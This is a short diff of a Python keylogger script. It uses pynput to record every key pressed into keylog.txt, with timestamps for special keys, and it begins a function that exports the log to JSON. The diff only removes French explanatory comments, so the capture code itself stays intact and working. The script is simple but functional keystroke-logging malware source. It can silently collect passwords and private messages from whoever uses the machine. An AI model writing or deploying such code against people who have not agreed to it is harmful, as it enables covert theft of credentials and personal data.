@@ -1,5 +1,5 @@
-from pynput import keyboard #importation de la classe keyboard de la bibliotheque pynput
-from datetime import datetime #importation date
+from pynput import keyboard 
+from datetime import datetime 
 import os
 import json
 
@@ -7,21 +7,21 @@ import json
 def timestamp():
     return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-output_file = "keylog.txt" #definition d un fichier de sortie
+output_file = "keylog.txt" 
 
 
-def on_press(key): #definition de la fonction on_press(key) qui affiche la touche appuyé
+def on_press(key): 
     try:
       with open(output_file, 'a') as f:
-          f.write(key.char) #caractere normale
+          f.write(key.char) 
     except AttributeError:
         with open(output_file, 'a') as f:
-            f.write(f'[ {str(key)} ]') #caractere speciale 
+            f.write(f'[ {str(key)} ]') 
             with open(output_file, 'a') as f: #pour la date
                 f.write(f"{timestamp()}")
 
-with keyboard.Listener(on_press=on_press) as listener: #création d' un objet listener pour detecter les touches du clavier
-    listener.join() #utilisation de listener.join() pour attendre indéfiniment que l utilisateur appuie sur les touches
+with keyboard.Listener(on_press=on_press) as listener: 
+    listener.join() 
 
 def export_to_json():
     with open(output_file, 'r') as f:
